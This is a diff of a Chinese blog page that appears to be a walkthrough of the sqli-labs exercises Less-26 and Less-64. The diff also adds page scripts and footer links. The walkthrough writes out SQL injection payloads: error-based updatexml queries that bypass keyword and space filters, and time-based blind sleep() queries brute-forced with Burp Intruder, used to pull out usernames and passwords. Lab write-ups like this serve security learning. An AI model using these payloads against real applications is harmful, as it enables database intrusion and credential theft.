@@ -86,6 +86,11 @@
         <style id="style_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("style_css","/css/style.min.css?uVzgA6RLrOm13Ukw8Qgy+A==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
 
         
+            
+                <style id="prettify_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("prettify_css","/css/prettify.min.css?zp8STOU9v89XWFEnN+6YmQ==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+                <style id="prettify_theme"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("prettify_theme","/css/prettify/atelier-sulphurpool-light.min.css?/Nfsq1v6eSrAgiV+c/CKvQ==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+            
+        
 
     
 
@@ -492,6 +497,16 @@
 <p>14、Less-26<br>(1)根据提示输入<code>?id=1</code>，用户名和密码显示正常，添加单引号<code>&#39;</code>，提示语法错误，说明单引号被拼接到后台SQL查询语句，添加–+注释发现依旧报错，猜测对–+进行了过滤。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.1.png" alt="less-26.1"><br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.2.png" alt="less-26.2"><br>(2)使用<code>&#39;</code>闭合，对于注释&#x2F;结尾字符，用<code>;%00</code>作为结尾<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.3.png" alt="less-26.3"><br>(3)使用order by，页面报错显示or被过滤，使用双写、空格、注释等多次尝试，发现空格，or，and,&#x2F;*,#,–,&#x2F;等符号都被过滤。直接采用报错注入方式。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.4.png" alt="less-26.4"><br>(4)爆库名：构造payload为<code>?id=1&#39; aandnd(updatexml(1,concat(0x23,database(),0x23),1));%00</code>，使用双写避免and被过滤，windows上的apache对空格编码的转义有问题，需要使用()绕过空格<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.5.png" alt="less-26.5"><br>(5)爆表名：构造payload为：<code>?id=1&#39; || updatexml(1, concat(0x7e, (select (group_concat(table_name)) from (infoorrmation_schema.tables) where (table_schema=database()))) ,1)  || &#39;1&#39;=&#39;1</code>，其中由于information存在or，需要双写。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.6.png" alt="less-26.6"><br>(6)爆列名：与爆表名类似，构造payload为：<code>id=1&#39; || updatexml(1, concat(0x7e, (select (group_concat(column_name)) from (infoorrmation_schema.columns) where (table_name=&#39;users&#39;))) ,1)  || &#39;1&#39;=&#39;1</code><br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.7.png" alt="less-26.7"><br>(7)爆记录：构造payload为将用户名和密码从users表中回显：<code>id=1&#39; || updatexml(1, concat(0x23, (select (group_concat(  concat_ws(0x7e,username, passwoorrd)  )) from (users))) ,1)  || &#39;1&#39;=&#39;1</code><br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.8.png" alt="less-26.8"><br>也可以使用<code>id=1&#39; || updatexml(1, concat(0x7e, (select (group_concat( concat_ws(0x7e,username,passwoorrd))) from (users) where(id=num))) ,1)  || &#39;1&#39;=&#39;1</code>，通过改变id的值单个记录显示<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.9.png" alt="less-26.9"><br>15、Less-64<br>(1)构造<code>id=1&#39;</code>，页面没有显示用户信息也没有SQL语句语法报错，则添加–+注释，对id&#x3D;1’、id&#x3D;1”、id&#x3D;1’)、id&#x3D;”)、id&#x3D;1))等依次尝试，当<code>id=))--+</code>时页面返回id&#x3D;1的用户信息<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-64.1.png" alt="less-64.1"><br>(2)构造<code>id=1)) order by num--+</code>，num从1开始递增，当num为3时页面正常，num为4时无显示，说明数据有3列<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-64.2.png" alt="less-64.2"><br>(3)使用联合查询找注入点，结果不可行<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-64.3.png" alt="less-64.3"><br>(4)使用时间注入方式判断，payload为<code>id=1)) and sleep(3)--+</code>，有延迟，进行时间注入<br>(5)数据库名长度：构造payload为<code>id=1)) and if(length(database())=8,1,sleep(2))--+</code>，页面返回正确且较快，当长度为7和9时都有延迟，说明数据库名长度为8<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-64.4.png" alt="less-64.4"><br>(6)构造payload：<code>id=1)) and if(left(database(),1)=&#39;s&#39; , sleep(3), 1) --+</code>，页面返回正确且较快，当为其他的字母时有延迟。通过改变<code>left(database(),num)</code>中num的大小以及匹配的字符，将数据库名得出<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-64.5.png" alt="less-64.5"><br>(7)由于手动一次次尝试较为麻烦，可以使用burpsuit进行爆破，url中payload为<code>id=1))and if(left(database(),1)=&#39;s&#39; , sleep(1), 1) --+</code>，使用burp抓包，将数据发送给intruder，清除原有变量，重新选定变量为第num个字符和字符，配置有效载荷进行爆破。但是由于Less-64只提供130次尝试，所以有限制。<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-64.6.png" alt="less-64.6"><br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-64.7.png" alt="less-64.7"><br>(8)数据库名：构造payload：<code>id=1))and if(left(database(),8)=&#39;security&#39; , sleep(2), 1) --+</code>，页面返回正常且较快则说明数据库名为security<br>(9)爆表：构造payload：<code>id=1)) and if(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1)=&#39;e&#39;,1,sleep(2))--+</code>，和数据库名的爆破相同，仅需修改substr的第二个参数值和设定的字符。<br>(10)爆列：构造payload为：<code>id =1)) and if(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1,1)=&#39;u&#39;,1,sleep(2))--+</code>，修改substr的第二个参数值和设定的字符。<br>(11)爆记录：构造payload为：<code>id=1))and if(substr((select username from security.users limit 0,1),1,1)=&#39;d&#39;,1,sleep(2))--+</code>，修改substr的第二个参数和设定的字符，密码爆破相同</p>
 
         
+                <blockquote style="margin: 2em 0 0;padding: 0.5em 1em;border-left: 3px solid #F44336;background-color: #F5F5F5;list-style: none;">
+                    <p><strong>
+                         
+                            版权声明：本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank">CC BY 4.0</a>许可协议，转载请注明出处
+                        </strong>
+                        <br>
+                        <strong>本文链接：</strong><a href="https://etamsylate-pupu.github.io/%E6%8A%80%E6%9C%AF/16.html">https://etamsylate-pupu.github.io/%E6%8A%80%E6%9C%AF/16.html</a>
+                    </p>
+                </blockquote>
+        
     
 
     
@@ -695,6 +710,28 @@
             <li class="divider"></li>
         
     
+        <li>
+            <a href="/links" title="友链">
+                
+                    <i class="material-icons sidebar-material-icons">links</i>
+                
+                友链
+            </a>
+        </li>
+        
+    
+        <li>
+            <a href="/about" title="关于">
+                
+                    <i class="material-icons sidebar-material-icons">person</i>
+                
+                关于
+            </a>
+        </li>
+        
+            <li class="divider"></li>
+        
+    
 
     <!-- Article Number  -->
     
@@ -830,6 +867,11 @@ It will not impact the appearance and can give developers a lot of support :)
         <div id="copyright">
             Copyright&nbsp;©&nbsp;<span year></span>&nbsp;Tsuki-shining
             
+                <br>
+                
+                    <a target="_blank" href="http://www.miitbeian.gov.cn" rel="nofollow noopener">赣ICP备2020013818号</a>
+                
+            
         </div>
 
         <!-- Paradox Footer Right Section -->
@@ -914,6 +956,12 @@ It will not impact the appearance and can give developers a lot of support :)
 
 <!-- Import prettify js  -->
 
+    
+        
+            <script>lsloader.load("prettify_js","/js/prettify.min.js?WN07fivHQSMKWy7BmHBB6w==", true)</script>
+        
+    
+
 
 
 <!-- Window Load -->
@@ -924,6 +972,13 @@ It will not impact the appearance and can give developers a lot of support :)
         $('.post-toc-wrap').parent('.mdl-menu__container').css('position', 'fixed');
     });
 
+    
+        
+            $(function() {
+                $('pre').addClass('prettyprint linenums').attr('style', 'overflow:auto;');
+                prettyPrint();
+                })
+        
     
     
 </script>
@@ -958,7 +1013,7 @@ It will not impact the appearance and can give developers a lot of support :)
     var copyrightNow = new Date().getFullYear();
     var textContent = document.querySelector('span[year]')
 
-    copyrightSince = 0000;
+    copyrightSince = 2020;
     if (copyrightSince === copyrightNow||copyrightSince === 0000) {
         textContent.textContent = copyrightNow
     } else {
